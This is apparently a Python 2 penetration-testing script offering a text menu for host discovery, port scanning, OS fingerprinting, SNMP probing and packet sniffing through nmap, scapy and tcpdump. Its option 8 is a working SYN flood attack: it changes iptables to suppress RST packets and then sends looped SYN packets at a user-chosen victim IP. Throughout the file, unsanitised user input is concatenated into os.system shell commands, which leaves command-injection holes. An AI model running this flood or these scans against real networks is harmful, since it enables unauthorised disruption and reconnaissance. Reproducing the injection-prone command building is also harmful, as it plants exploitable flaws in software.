import os , sys , time, nmap
from scapy.all import *
import socket

# Get ip of the user.
def get_ip(): 
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

# Checking ip with icmp requests generated using Scapy.
def isAlive(x):
	response = sr1(IP(dst=str(x))/ICMP(),timeout=2 , verbose=0)

	if response is None:
		return False
	else:
		return True

# Checking for live hosts among all hosts in icmp.dat file.
def liveHosts(): 
	fileHandlerLH = open("logFiles_qb/liveHosts.txt", "wb")
	os.system("touch logFiles_qb/icmp.dat")
	fileHandlerIcmp = open("logFiles_qb/icmp.dat" , "r")
	if os.stat("logFiles_qb/icmp.dat").st_size == 0: #check if icmp.dat file has any IP to scan.
		print("icmp.dat file is empty. Please make a host scan [opt.1] or provide an IP:")
		newIp = str(raw_input())
		fileHandlerLH.write(newIp)
	else: 
		for line in fileHandlerIcmp:	
			if isAlive(str(line).strip()):
				print(line + "is up.")
				fileHandlerLH.write(line)
			else:
				print(line + "is down.")


if __name__ == "__main__":
	# Checking if output dir. exists
	if os.path.isdir("logFiles_qb"):
		pass
	else:
		os.system("mkdir logFiles_qb")

	print("############################################################")
	print("#:::::::.qb_penTesting is up and running smoothly.:::::::::#")
	print("############################################################")

while True:
	# Display menu
	print("\n")
	print("You can use one of the options down there :")
	print("0  >> Display user guide (user_guide)")
	print("1  >> Scan for live IP's (ICMP_scan)")
	print("2  >> Scan all ports (port_scan)")
	print("3  >> Scan open ports (open_port_scan)")
	print("4  >> OS Identification (OS_fingerprint_scan)")
	print("5  >> Router and Firewall Detection (fWallRouter_scan)")
	print("6  >> Web server Identification (web_server_scan)")
	print("7  >> Scan and find snmp protocol devices (SNMP_scan)")
	print("8  >> Initiate SYN flood [a.k.a half-open] attack (SYN_flood)")
	print("9  >> List the all logged files up to now (Show)")
	print("10 >> Monitor network traffic (Sniff)")
	print("Choice >>>")
	choice = input()
	
	if choice == 0:

		fileHandlerUG = open("logFiles_qb/user_guide.txt") # User guide file handler.
		for line in fileHandlerUG:
			print(line) # Print user guide content
	
	if choice == "exit()": # If input = exit() then terminate.
		break
	if choice == 1:
		print("Provide an ip address range to scan for live hosts")
		print("Lower limit IP: ")
		ipMin = "" + str(raw_input()) # Taking ip as raw_input
		print("\nUpper limit IP: ")
		ipMax = str(raw_input())
		
		# Calculating process time for better ux.
		sTime = time.time(); 
		# Ping scan without port probing. / nmapOutputFile.txt is a temporary file to save command output.
		os.system("nmap -sn " + ipMin + "-" + ipMax.split(".")[3] + " > nmapOutputFile.txt")
		eTime = time.time();
		
		file = open("nmapOutputFile.txt" , "r") # File handler for nmap command output file.
		fileHandlerIcmp = open("logFiles_qb/icmp.dat" , "wb") # Create icmp.dat in write mode.
		print ("\n" + 10*"*" + "Live Hosts" + 10*"*") # Output editing.
		i = 0
		for line in file:
			if "report" in line: # Iterating through temporarily created command output file.
				print(8*" " + line.split()[4]) 
				fileHandlerIcmp.write(line.split()[4] + "\n")
				i+=1
		print(10*"*" + "Live Hosts" + 10*"*")
		print("\n..." + str(int(ipMax.split(".")[3]) - int(ipMin.split(".")[3]) + 1) + " IP addresses ("+str(i)+" hosts up) scanned in " + str(eTime - sTime) + " seconds...")
		fileHandlerIcmp.close()
		os.system("rm nmapOutputFile.txt") # Clear temporary file.
				
	if choice == 2:
		liveHosts() 
		os.system("touch nmapOutputFile.txt") # Create nmapOutputFile.txt file
		fileHandlerLH = open("logFiles_qb/liveHosts.txt","r") # Open liveHosts.txt in 'read' mode
		print("Choose protocol for port scan operation: 1)TCP 2)UDP 3)TCP && UDP")
		print("[!]WARNING! If you ask for /udp protocols it will take some time.")
		protocolChoice = input()
		print("Provide port range as lower and upper limit.")
		print("[!]WARNING! Min value is 1 -- Max value is 65535 --> Port range")
		print("[!]WARNING! All of your new scan results will be appended to the ports.dat file")
		lowerPortLimit = input()
		upperPortLimit = input()
		# Providing the user different scan options as port range and protocol specification.
		if protocolChoice == 1: 
			for line in fileHandlerLH: 
				# Scan ports with TCP protocol in specified port range
				os.system("nmap -d -d -sS -p " + str(lowerPortLimit) + "-" + str(upperPortLimit) + " " + line.strip() + " >> nmapOutputFile.txt"); 
		if protocolChoice == 2:
			for line in fileHandlerLH:
				# Scan ports with UDP protocol in specified port range
				os.system("nmap -d -d -sU -p " + str(lowerPortLimit) + "-" + str(upperPortLimit) + " " + line.strip() + " >> nmapOutputFile.txt");
		if protocolChoice == 3:
			for line in fileHandlerLH:
				# Scan ports with TCP & UDP protocol in specified port range
				os.system("nmap -d -d -sS -sU -p " + str(lowerPortLimit) + "-" + str(upperPortLimit) + " " + line.strip() + " >> nmapOutputFile.txt");
		nmapOutputFileHandler = open("nmapOutputFile.txt" , "r") # Open nmapOutputFile.txt in read mode
		portsFileHandler = open("logFiles_qb/ports.dat" , "a+") # Open new.txt in write/binary mode
		fileLive = open("logFiles_qb/liveHosts.txt" , "r")
		lines = [line.rstrip('\n') for line in open("logFiles_qb/liveHosts.txt")] # fetch ip's from liveHosts to list
		
		counter = -1
		for line in nmapOutputFileHandler:
			if not len(line.strip()) == 0:
				if "/" in line.split()[0]: 
					portsFileHandler.write(line.split()[0] + "    \t" +  line.split()[1] + "\t" + line.split()[2] + "\t" + lines[counter] + "\n")
				if "PORT" == str(line.split()[0]):
					counter += 1
					if counter > (len(lines)-1): # this if-else structure is controlling if list goes out of bounds. Kind of exception handling manually.
						counter -= 1
					else:
						pass 
		os.system("rm nmapOutputFile.txt") # Remove temporarily created command output file.
	if choice == 3:
		liveHosts()
		nm=nmap.PortScanner() # Creates scanner object.
		fileHandlerLH = open("logFiles_qb/liveHosts.txt" , "r")
		fileHandlerOpenPorts = open("logFiles_qb/open_ports.dat" , "wb")
		for host in fileHandlerLH: # Traverse hosts in fileHandlerLH
			fileHandlerOpenPorts.write("\nPorts on host: " + host)
			host = host.strip() 
			nm.scan(host) # Host scan with nmap-module
			for protocol in nm[host].all_protocols(): # Iterating through all possible protocols
				portList=nm[host][protocol].keys() # Fetching keys(ports) to portList list.
				portList.sort()
				for port in portList:
					fileHandlerOpenPorts.write("port: " + str(port) +"/" + str(protocol) + "\t" + "state: " + nm[host][protocol][port]['state'] + "\n")

	if choice == 4:
		liveHosts()
		fileHandlerLH = open("logFiles_qb/liveHosts.txt" , "r")
		fileHandlerOS = open("logFiles_qb/OS_scan.dat" , "wb")
		for line in fileHandlerLH:
			os.system("nmap -O " + line.strip() + " >> tempOsResultFile.txt") # Used nmap with option -O to scan os details.

		fileHandlerTempOSScanFile = open("tempOsResultFile.txt" , "r")
		for result in fileHandlerTempOSScanFile:
			if not len(result.strip()) == 0: # Editing output to have a clean output file as desired.
				if "192" in result:
					fileHandlerOS.write("\nOS info of " + result)
				if "Device" in result:
					fileHandlerOS.write(result)
				if "CPE" in result:
					fileHandlerOS.write(result)
				if "details" in result:
					fileHandlerOS.write(result)
		os.system("rm tempOsResultFile.txt") # Remove temporarily created command output file.
	

	if choice == 6:
		os.system("rm logFiles_qb/web.dat")
		print("Please provide domain names to scan: ")
		print("If multiple domains will be provided just put a whitespace between domain names [!]")
		domainNames = raw_input()
		for host in domainNames.split():
			os.system("nmap -T4 " + host +">> logFiles_qb/web.dat") # T4 accelerates the nmap process. Maps all aspects of specified domains.
			
	if choice == 7:
		if os.path.exists("logFiles_qb/snmp.dat"):
			os.system("rm logFiles_qb/snmp.dat")
		liveHosts()
		fileHandlerLH = open("logFiles_qb/liveHosts.txt" , "r")
		for line in fileHandlerLH:
			# sU for UDP port specification as 161 numbered port. default and snmp-sysdescr are stock Nmap NSE scripts.
			os.system("nmap -sU -p 161 --script default,snmp-sysdescr " + line.strip() +" >> logFiles_qb/snmp.dat");

		

	if choice == 8:
		sourceIP = get_ip()
		# Altering iptable binded to kernel to prevent user's computer from sending RST flags for a SYN-ACK response flag.
		os.system("iptables -A OUTPUT -p tcp -s "+ str(sourceIP) +" --tcp-flags RST RST -j DROP") 
		print("Provide an ip to attack: ")
		victim_ip = raw_input()
		print("[!] SYN_flood attack will be efficient in open /tcp ports, strongly advised to specify open ports")
		print("Provide port range: (To attack only one port, e.g port 22 simply write 22 22)")
		print("Lower limit:")
		lower_port_limit = input()
		print("Upper limit:")
		upper_port_limit = input()
		print ("Field Values of packet sent")
		# Creating a network packet with random sender port numbers and desired other specifications with Scapy.
		p=IP(dst=victim_ip,id=1111,ttl=99)/TCP(sport=RandShort(),dport=(lower_port_limit,upper_port_limit),seq=12345,ack=1000,window=1000,flags="S")/"hi"
		ls(p)
		print ("Sending Packets in 0.1 second intervals for timeout of 4 sec")
		ans,unans=srloop(p,inter=0.1,retry=2,timeout=4) # Sending packets in a loop and storing data in ans,unans.
		print ("Summary of answered & unanswered packets")
		ans.summary() # Print ans summ
		unans.summary() # Print unans summ

	if choice == 9:
		os.system("ls -l logFiles_qb/") # List the output files directory
		print("\n>>> Give the name of a file list above to see the contents:")
		showFile = raw_input()
		print("\n>>> Contents of [" + showFile +"] file\n[!]With line numbers")
		os.system("cat -n logFiles_qb/"+ showFile) # Show file content with line numbers for easy eyetrace reading.

	if choice == 10:
		print(">>> Input an ip address as host:")
		sniffedIP = raw_input()
		print("Choose on of the options below: ")
		print("1) Sniff the all network traffic")
		print("2) Sniff just the host traffic")
		snifferChoice = input()
		if snifferChoice == 1: # Making input ip ready for network scan / e.g 192.168.1.100 --> net 192.168.1.0/24
			sniffedIP = "net " + sniffedIP.split(".")[0] + "." + sniffedIP.split(".")[1] + "." + sniffedIP.split(".")[2] + ".0/24"
		else:
			sniffedIP = "host " + sniffedIP # Making input ip ready for host scan / e.g 192.168.1.100 --> host 192.168.1.100
		print("Input an ip range as lower and upper limits to sniff:")
		print("[!] If do not want to specify ports just input 0")
		print("[!] Simply use Ctrl+C to stop sniffer.[!]")
		print("Lower limit:")
		sniffLowerPort = input() 
		if(sniffLowerPort == 0):
			os.system("tcpdump -i any " + sniffedIP + " -vv") # Run tcpdump for network sniffing.
		print("Upper limit:")
		sniffUpperPort = input()
		print("Pick a protocol filter:")
		print("1)TCP 2)UDP")
		protoChoice = input()
		if protoChoice == 1:
			os.system("tcpdump -i any " + str(sniffedIP) + " and portrange " + str(sniffLowerPort)+"-"+str(sniffUpperPort)+" and tcp "+"-v") # Run tcp with specified inputs.
		if protoChoice == 2:
			os.system("tcpdump -i any " + str(sniffedIP) + " and portrange " + str(sniffLowerPort)+"-"+str(sniffUpperPort)+" and udp "+"-v") # Run tcp with specified inputs.
		# 'any' keyword provides the flexilibity to tcpdump to look for packets coming/going via any networking interface.

	else:
		pass

















